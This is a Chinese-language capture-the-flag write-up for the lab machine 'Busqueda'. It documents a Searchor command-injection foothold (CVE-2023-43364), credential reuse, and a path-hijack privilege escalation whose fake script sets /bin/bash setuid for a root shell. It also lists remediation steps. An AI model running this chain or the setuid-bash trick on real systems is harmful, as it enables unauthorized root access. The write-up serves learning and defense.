## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Busqueda
2. 難度:Eazy
3. IP:10.129.228.217

### 主要發現：
1. 漏洞 ：利用舊版本已公開漏洞(CVE-2023-43364)透過命令注入達成遠端程式碼執行(RCE)（風險等級：Critical）
2. 漏洞 ：繞過規定的路徑環境變數在可寫目錄下執行sudo權限腳本（風險等級：Critical）

### 攻擊鏈摘要：
經過探索可得知網站使用的Searchor的版本資訊，其版本存在尚未修補的漏洞，可注入系統命令，取得控制權。在系統內文件找到未被妥善存放的憑證，可利用憑證進行橫向移動。雖然使用者限制了sudo使用權限，但路徑並未被鎖定，攻擊者可移動至tmp等全可讀寫路徑以假腳本覆蓋掉原腳本，權限提升至root。

### 潛在影響：
1. Searchor的版本過舊，會造成命令注入，導致外部攻擊者獲得系統存取權限，造成重要文件外洩。
2. 使用者憑證未被妥善保管，若外洩可能造成敏感資料外洩及權限提升。
3. 腳本使用的路徑並未被限制，使攻擊者權限提升，將會引發重大資料外洩以及系統崩潰。

### 修復建議：
1. 立即更新Searchor至最新版。
2. 使用者憑證資料確實設立讀寫權限，禁止低權限身分隨意取得。
3. 設定PATH變數，將腳本路徑鎖死，杜絕路徑劫持造成的權限提升。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.228.217
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.129.228.217
sudo nmap --script=vuln -p22,80 10.129.228.217
```
<img width="937" height="260" alt="螢幕擷取畫面 2026-02-14 202045" src="https://github.com/user-attachments/assets/719a6f7d-ae48-43aa-80a2-d80523552ca1" />
<img width="1013" height="478" alt="螢幕擷取畫面 2026-02-14 202233" src="https://github.com/user-attachments/assets/4deb17e7-3fe1-483c-96a6-37a2a14e6674" />
<img width="699" height="286" alt="螢幕擷取畫面 2026-02-14 202335" src="https://github.com/user-attachments/assets/dbefe1f1-2469-4414-8742-c373c5505c5a" />

將取得的URL寫入/etc/hosts

<img width="691" height="235" alt="螢幕擷取畫面 2026-02-14 202240" src="https://github.com/user-attachments/assets/89665509-5b4f-4970-ae91-8533ff6faaf1" />

探索80web主頁
<img width="1466" height="808" alt="螢幕擷取畫面 2026-02-14 202538" src="https://github.com/user-attachments/assets/ae0f208a-9bb5-4b37-86cd-d945104f5ab1" />
<img width="1873" height="676" alt="螢幕擷取畫面 2026-02-14 202842" src="https://github.com/user-attachments/assets/ce056eff-76bf-4df7-b61c-cdd16a070d55" />
<img width="602" height="235" alt="螢幕擷取畫面 2026-02-14 203008" src="https://github.com/user-attachments/assets/356b1151-a228-42ee-b7e9-7d4325abaa25" />

### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄
```bash
sudo gobuster dir -u http://searcher.htb -w /usr/share/dirbuster/wordlist/directory-2.3-medium.txt
```
<img width="1113" height="333" alt="螢幕擷取畫面 2026-02-14 205045" src="https://github.com/user-attachments/assets/36f1e2f3-f175-4c88-8677-7a9653d8df5f" />

探索各模組是否有公開漏洞

<img width="503" height="101" alt="螢幕擷取畫面 2026-02-14 203046" src="https://github.com/user-attachments/assets/c832703a-d329-4641-9507-198c44bc22bb" />
<img width="515" height="95" alt="螢幕擷取畫面 2026-02-14 203117" src="https://github.com/user-attachments/assets/4c63e715-1e00-4c79-95d3-93f23a745df1" />
<img width="1315" height="678" alt="螢幕擷取畫面 2026-02-14 203743" src="https://github.com/user-attachments/assets/904f4937-845d-4a6b-9e34-d8d4b89ff268" />

找到漏洞PoC

<img width="1792" height="808" alt="螢幕擷取畫面 2026-02-14 211623" src="https://github.com/user-attachments/assets/aaacf11f-d799-4b1d-b383-b48c79837865" />

### 2.3 初始存取(Initial Access)

使用Burp Suite抓取請求

<img width="961" height="446" alt="螢幕擷取畫面 2026-02-14 211557" src="https://github.com/user-attachments/assets/38091da6-d701-496d-a208-0ae25de0f85f" />

開啟nc監聽

<img width="385" height="73" alt="螢幕擷取畫面 2026-02-14 211713" src="https://github.com/user-attachments/assets/840df856-99d2-4379-9b42-0f9350b552ab" />

將Payload注入
(注意，Payload需經過URL編碼)

<img width="1189" height="409" alt="螢幕擷取畫面 2026-02-14 214356" src="https://github.com/user-attachments/assets/cac09014-eff8-4641-9598-2e1c0cb7e805" />

獲得系統權限

<img width="851" height="165" alt="螢幕擷取畫面 2026-02-14 214425" src="https://github.com/user-attachments/assets/42957cf7-e4e9-45d1-bc08-07b253840ae1" />
<img width="544" height="195" alt="螢幕擷取畫面 2026-02-14 214726" src="https://github.com/user-attachments/assets/4abf2e03-8786-4964-9c60-f293c901aa4b" />


### 2.4 橫向移動(Lateral Movement)

嘗試提權時發現必須有使用者密碼

<img width="643" height="305" alt="螢幕擷取畫面 2026-02-14 215250" src="https://github.com/user-attachments/assets/20a26267-6a0f-4b44-be3c-474c336b8aeb" />

經過內部探索後找到一組憑證

<img width="971" height="797" alt="螢幕擷取畫面 2026-02-14 215458" src="https://github.com/user-attachments/assets/d53e8333-cb0b-4300-b333-d1cd0b496f5b" />

經過手動碰撞，得知憑證為原使用者之密碼，可登入SSH

<img width="738" height="390" alt="螢幕擷取畫面 2026-02-14 215628" src="https://github.com/user-attachments/assets/840bb14d-3c04-4e23-bad1-d96e9cf74149" />

### 2.5 權限提升(Privilege Escalation)

枚舉sudo權限

<img width="1470" height="187" alt="螢幕擷取畫面 2026-02-14 215713" src="https://github.com/user-attachments/assets/754b88d3-97b1-4bb8-ba70-a0e68846b716" />

嘗試利用sudo權限

<img width="1463" height="251" alt="螢幕擷取畫面 2026-02-14 220720" src="https://github.com/user-attachments/assets/de119cb4-7a97-4e00-95f9-e456a6f8176b" />

嘗試竄改腳本，但並未擁有讀寫權限

<img width="982" height="265" alt="螢幕擷取畫面 2026-02-14 222700" src="https://github.com/user-attachments/assets/2d3c7ec3-c447-471c-a648-975aadd8ac52" />

在tmp目錄下創造同名假腳本，並寫入提權方案，成功提權

```bash
cd /tmp
nano full-checkup
```
文件內容:
```bash
#! /bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```
利用:
```bash
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
/tmp/bash -p
```

<img width="948" height="528" alt="螢幕擷取畫面 2026-02-14 224738" src="https://github.com/user-attachments/assets/f9e02318-6d37-4768-805a-1b35005c6061" />

### 2.6 最終成果(Impact)

獲得root.txt

<img width="1193" height="247" alt="螢幕擷取畫面 2026-02-14 224957" src="https://github.com/user-attachments/assets/850a2eee-b3c1-483c-a93c-53b71e8d7ba9" />

---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

攻擊鏈清晰，並未有相對複雜的邏輯，或高深技術，適合新手。

### 浪費時間的部分：

searchsploit並未搜尋到有用結果，最後還是依賴Google才得以解決。

### 新知識點：

路徑劫持是很常見的提權方式，也可在本機製作好提權腳本後利用wget上傳，直接執行。

### 與實戰對應：

因公開漏洞是掛在在2.4.2，直接搜2.4.0可能需要找一下，考驗搜尋技巧。

